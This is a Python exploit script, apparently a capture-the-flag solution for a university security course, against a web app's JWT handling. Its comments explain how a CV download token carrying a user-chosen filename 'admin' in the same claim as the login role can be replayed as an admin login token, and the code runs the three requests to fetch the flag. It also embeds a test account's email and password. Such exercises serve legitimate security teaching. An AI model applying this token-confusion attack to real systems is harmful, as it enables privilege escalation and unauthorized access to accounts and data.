import requests

# b1
# ==
# By looking at the source code we'll notice, that the generateToken function is used twice in index.js. The first time
# to generate the JWT after the login and the second time for generating a download token for the CV.
# The problem is, that the the ROLE of the user, who logged in is stored in claims.auth. At the same location the
# second usage of generateToken stores the original filename of the CV file, which is user manipulable.
# The key claims.sub is identical in both cases: the user's email address.
# In preparation of the exploit we'll create a user and upload an empty file named 'admin'
# The exploit works as follows:
#  1) login in the account with the "admin" named CV, and retrieve its JWT login token
#  2) use this token for calling GET "/api/cv" and store the download token
#  3) now use this download token as login token for GET "/api/flag" and celebrate your flag


host = "itsec.sec.in.tum.de:7060"

# random user we created manually in advance
# and upload an empty cv file named "admin"
email = "fabrain@tum.de"
password = "123456"


# This method retrieves a new JWT by calling the login route.
#  1) login in the account with the "admin" named CV, and retrieve its JWT login token
def retrieve_token():
    login = requests.post("http://{}/api/login".format(host), json={
        "email": email,
        "password": password
    })

    response = login.json()

    if response["status"] != "success":
        print("Something went wrong with the request {} {} {}".format(login.status_code, login.text, login.headers))
        return "ERROR"

    return response["token"]

# 2) use this token for calling GET "/api/cv" and store the download token
def get_admin_token(token):
    headers = {"Authorization": "Bearer {}".format(token)}
    r = requests.get("http://{}/api/cv".format(host), headers=headers)

    response = r.json()

    if response["status"] != "success":
        print("Something went wrong with the request {} {} {}".format(r.status_code, r.text, r.headers))
        return "ERROR"

    return response["token"]

# 3) now use this download token as login token for GET "/api/flag" and celebrate your flag
def get_flag(token):
    headers = {"Authorization": "Bearer {}".format(token)}
    r = requests.get("http://{}/api/flag".format(host), headers=headers)

    return r.text


t = retrieve_token()
admin_token = get_admin_token(t)
print(get_flag(admin_token))

